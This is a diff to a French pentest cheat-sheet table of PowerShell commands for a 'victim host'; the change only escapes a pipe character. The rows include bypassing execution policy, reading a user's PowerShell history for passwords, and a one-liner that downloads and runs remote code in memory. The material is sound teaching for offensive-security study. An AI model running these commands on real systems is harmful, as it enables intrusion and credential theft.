@@ -1411,6 +1411,6 @@ Voici quelques-unes des façons dont PowerShell peut nous aider.
 | `Get-Module` | Liste les modules disponibles chargés pour utilisation. |
 | `Get-ExecutionPolicy -List` | Affiche les paramètres de la politique d'exécution pour chaque portée sur un hôte. |
 | `Set-ExecutionPolicy Bypass -Scope Process` | Cela changera la politique pour notre processus actuel en utilisant le paramètre -Scope. Cela rétablira la politique une fois que nous quitterons le processus ou le terminerons. C'est idéal car nous ne ferons pas de changement permanent sur l'hôte victime. |
-| `Get-ChildItem Env: | ft Key,Value` | Retourne les valeurs d'environnement telles que les chemins clés, les utilisateurs, les informations sur l'ordinateur, etc. |
+| `Get-ChildItem Env: '|' ft Key,Value` | Retourne les valeurs d'environnement telles que les chemins clés, les utilisateurs, les informations sur l'ordinateur, etc. |
 | `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Avec cette commande, nous pouvons obtenir l'historique PowerShell de l'utilisateur spécifié. Cela peut être très utile car l'historique des commandes peut contenir des mots de passe ou nous orienter vers des fichiers de configuration ou des scripts contenant des mots de passe. |
 | `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL pour télécharger le fichier'); <commandes suivantes>"` | C'est un moyen rapide et facile de télécharger un fichier depuis le web en utilisant PowerShell et de l'appeler depuis la mémoire. |
